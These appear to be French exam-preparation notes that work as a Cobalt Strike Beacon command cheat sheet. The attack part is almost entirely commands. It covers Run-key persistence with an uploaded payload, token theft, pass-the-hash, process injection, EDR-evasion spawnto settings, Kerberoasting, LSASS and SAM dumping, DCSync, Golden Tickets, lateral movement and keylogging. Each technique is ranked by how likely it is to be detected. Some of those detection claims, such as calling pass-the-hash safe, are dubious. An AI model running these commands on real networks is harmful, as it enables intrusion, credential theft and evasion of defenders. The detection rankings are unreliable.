# Introduction à Cobalt Strike  

>Préparation initiale du framework Command & Control (**C2**) Cobalt Strike  

## Fenêtre Interact du Beacon — Présentation

Dans la console Cobalt Strike, un double-clic sur un Beacon ouvre l'onglet **Interact**.
- Panneau supérieur : sortie du Beacon (réponses de l'implant)
- Panneau inférieur : saisie des commandes
- Autocomplétion Tab disponible sur la plupart des commandes

>[OPSEC Consideration for Beacon Commands](https://www.cobaltstrike.com/blog/opsec-considerations-for-beacon-commands)  

## Commandes Beacon — OPSEC SAFE

```
getuid                      # Who am I? (domain\user + integrity level)
ls                      # Directory listing (default: current dir)
pwd                     # Current working directory
env                     # Environment variables
whoami /groups          # (via shell — OPSEC-UNSAFE, use carefully)
process_browser
steal_token 0000            # Impersonated User on current beacon host

cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
upload C:\Payloads\http_x64.exe

reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run
reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe

powerpick Register-ScheduledTask
powerpick Get-ScheduledTask
execute-assembly Seatbelt.exe

execute-assembly
powerpick 
spawnto x64 %windir%\sysnative\notepad.exe

download C:\path\to\file.xxx

beacon> net localgroup          # Local group memberships
beacon> net computers           # Enumerate domain computers (via NetAPI)
beacon> ipconfig                # Network config
beacon> netstat                 # Active connections
```

## Commandes Beacon — OPSEC CAUTION

```
shell schtasks          # list current scheduled task on beacon host

```


**OPSEC :** dans les notes d'examen, conserver un sleep d'au moins 30 secondes ; le profil par défaut est configuré via `set sleeptime`.

---

## File System — Fichiers

```
beacon> ls                      # List current directory
beacon> ls C:\Users             # List specific path
beacon> cd C:\Windows\Temp      # Change directory
beacon> pwd                     # Print working directory
beacon> mkdir C:\Temp\loot      # Create directory
beacon> rm C:\Temp\file.txt     # Delete file
beacon> download C:\file.txt    # Download file to CS client
beacon> upload /local/file.exe  # Upload file from CS client to target
```

---

## Process Management — Processus

```
beacon> process_browser         # GUI tab — process list with inject/steal_token/keylog/screenshot per-process options
beacon> kill <PID>              # Kill a process
beacon> inject <PID> x64 <listener>   # Inject shellcode into running process
beacon> migrate <PID>           # Migrate beacon to another process (changes PID)
```

**OPSEC :** `migrate` et `inject` utilisent `CreateRemoteThread` par défaut, ce qui peut être détecté.

---

## Spawn et gestion des tokens

```
beacon> getuid                  # Current user context
beacon> steal_token <PID>       # Steal token from process — impersonate that user
beacon> rev2self                # Revert to original token
beacon> make_token DOMAIN user password   # Create token with plaintext creds (no logon event)
beacon> pth DOMAIN\user <NTLM>  # Pass-the-Hash — creates impersonation token
beacon> getsystem               # Attempt privilege escalation (multiple techniques)
beacon> getuid                  # Confirm new context after token ops
```

**OPSEC :** `steal_token` est classé SAFE dans ces notes, sans nouveau processus. `pth` y est également classé SAFE, bien qu'il utilise `CreateProcessWithLogonW`.

---

## Configuration de spawnto — OPSEC

### Pourquoi spawnto est important

Pour certaines commandes post-exploitation (`execute-assembly`, `powerpick`, `inject`, etc.), Cobalt Strike exécute le payload dans un **processus temporaire** plutôt que dans celui du Beacon afin d'éviter qu'un crash ne termine le Beacon.

**Problème :** le processus temporaire par défaut est `rundll32.exe`, souvent surveillé par les EDR. Son lancement depuis un processus Beacon peut déclencher une alerte.

**Rôle de `spawnto` :** remplacer `rundll32.exe` par un autre processus Windows servant d'hôte d'exécution.

### Commandes

```cs
// Check current spawnto setting
beacon> spawnto

// Override per-beacon (do this immediately after getting a beacon)
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

// Alternative legitimate processes to blend in
beacon> spawnto x64 %windir%\sysnative\svchost.exe
beacon> spawnto x64 %windir%\sysnative\werfault.exe
```

### Configuration permanente dans le Malleable C2 Profile

```
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

Une configuration dans le profile s'applique à tous les Beacons. Un override individuel permet de s'adapter au contexte de l'hôte après analyse de `ps`.

### Workflow pour l'examen

```
1. Get beacon callback
2. beacon> process_browser             — GUI process list for that host (inject/steal_token/keylog from right-click menu)
3. beacon> spawnto x64 <process>       — pick something already in the process list
4. beacon> spawnto                     — verify it changed
5. Now run post-ex commands — sacrificial procs blend into existing process tree
```

**Pourquoi `dllhost.exe` ?** Windows l'utilise régulièrement comme COM surrogate. Dans ces notes, il est préféré au `rundll32.exe` par défaut pour limiter les indicateurs inhabituels durant l'examen.

### Note OPSEC

```
Tier:       SAFE — changing spawnto itself generates no telemetry
Effect:     All subsequent execute-assembly / powerpick / inject calls use new proc
Scope:      Per-beacon only — does not affect other beacons unless set in profile
Resets:     On beacon restart — re-apply after every new beacon or set in profile
```

---

## Exécution de code — Niveaux OPSEC

| Commande | OPSEC | Remarques |
|---------|-------|-------|
| `inline-execute <bof.o>` | SAFE | Exécution dans le thread Beacon, sans nouveau processus |
| `powerpick <PS cmd>` | SAFE | PowerShell unmanaged, sans powershell.exe |
| `execute-assembly <asm.exe>` | CAUTION | Fork & run avec processus spawnto |
| `run <cmd>` | UNSAFE | Crée un processus enfant visible du Beacon |
| `shell <cmd>` | UNSAFE | Lance cmd.exe |
| `powershell <cmd>` | UNSAFE | Lance powershell.exe |

```
beacon> inline-execute /path/to/bof.o [args]
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> execute-assembly /path/Rubeus.exe kerberoast /nowrap
beacon> run whoami                          # OPSEC-UNSAFE
beacon> shell dir C:\                       # OPSEC-UNSAFE
```

---

## Réseau et Pivoting

```
beacon> portscan <targets> <ports> <discovery> <max-sockets>
# Example:
beacon> portscan 10.10.5.0/24 22,80,443,445,3389 arp 1024

beacon> net view                            # SMB share enumeration
beacon> net localgroup Administrators       # Local admins on current host
```

---

## Lateral Movement

```
# OPSEC preference: winrm > wmi > psexec

beacon> jump winrm64 <target> <listener>    # WinRM — OPSEC-SAFE(er)
beacon> jump winrm <target> <listener>      # WinRM x86
beacon> remote-exec wmi <target> <cmd>      # WMI — OPSEC-CAUTION
beacon> jump psexec64 <target> <listener>   # psexec — OPSEC-UNSAFE (writes service)
beacon> jump psexec_psh <target> <listener> # psexec via PS — UNSAFE
```

---

## Attaques sur les credentials

```
# Kerberoast (SAFE — in-memory)
beacon> execute-assembly Rubeus.exe kerberoast /nowrap /outfile:\\127.0.0.1\...

# AS-REP Roast (SAFE)
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat

# LSASS — OPSEC ladder (least to most noisy)
beacon> krb_dump /user:<user> /service:krbtgt   # SAFE — Kerbeus-BOF, Kerberos API, no raw LSASS read
beacon> mimikatz sekurlsa::logonpasswords        # UNSAFE — avoid on exam

# SAM dump
beacon> hashdump                             # CAUTION — calls SamConnect
beacon> mimikatz lsadump::sam               # UNSAFE
```

---

## Reconnaissance du domaine

```
# PowerView via powerpick (OPSEC-SAFE)
beacon> powerpick Get-DomainUser -Properties samaccountname,description
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse
beacon> powerpick Get-DomainComputer -Properties dnshostname,operatingsystem
beacon> powerpick Get-DomainController
beacon> powerpick Get-DomainTrust
beacon> powerpick Find-LocalAdminAccess      # OPSEC-CAUTION — noisy lateral sweep

# SharpHound
beacon> execute-assembly SharpHound.exe -c All --zipfilename bh.zip
```

---

## Domain Dominance

```
# DCSync (CAUTION — replication event logged on DC)
beacon> dcsync DOMAIN\krbtgt
beacon> dcsync DOMAIN\Administrator

# Golden Ticket
beacon> mimikatz kerberos::golden /user:Administrator /domain:DOMAIN \
        /sid:<SID> /krbtgt:<hash> /ptt

# Pass-the-Ticket
beacon> execute-assembly Rubeus.exe ptt /ticket:<base64>
```

---

## Listeners et Spawning

```
# Spawn a new beacon to a different listener
beacon> spawn x64 <listener>               # Fork & run to listener
beacon> spawnas DOMAIN\user password <listener>   # Spawn as different user

# Link to SMB/TCP beacon (P2P)
beacon> link <target> <pipename>           # Connect to SMB beacon
beacon> connect <target> <port>            # Connect to TCP beacon
beacon> unlink <target> <PID>             # Disconnect P2P beacon
```

---

## Persistence — Privilégier le sans-disque

```
# Scheduled task (CAUTION — disk artifact)
beacon> run schtasks /create /tn "Update" /tr "C:\payload.exe" /sc onlogon

# COM hijack (SAFE — per-user, no admin needed)
beacon> execute-assembly SharpCOM.exe ...

# Preferred: Golden/Diamond Ticket (no disk artifact)
```

---

## Gestion du Beacon

```
beacon> note <text>             # Add a note/label to beacon in console
beacon> clear                   # Clear pending task queue
beacon> checkin                 # Force immediate checkin
beacon> exit                    # Kill beacon — use carefully
```

---

## Sorties et téléchargements

```
beacon> download <path>         # Queue file for download
View → Downloads                # In CS GUI — manage download queue
beacon> downloads               # List pending downloads
beacon> cancel <filename>       # Cancel a download
```

---

## Screenshot et Keylogging — Si nécessaire

```
beacon> screenshot              # Single screenshot — OPSEC-CAUTION
beacon> screenwatch             # Continuous screenshots — OPSEC-UNSAFE
beacon> keylogger               # Start keylogger — OPSEC-CAUTION
beacon> jobs                    # List running background jobs
beacon> jobkill <JID>           # Kill a background job
```

---

## Référence rapide OPSEC pour l'examen

```
SAFE:    inline-execute | powerpick | steal_token | jump winrm | pth
CAUTION: execute-assembly | remote-exec wmi | getsystem | dcsync | hashdump
UNSAFE:  shell | powershell | run | jump psexec | mimikatz direct | screenwatch
```

---

## Aide et commandes de référence

```
beacon> help sleep
beacon> help jump
beacon> help execute-assembly
beacon> help inline-execute
beacon> help powerpick
beacon> help pth
beacon> help steal_token
beacon> help dcsync
```
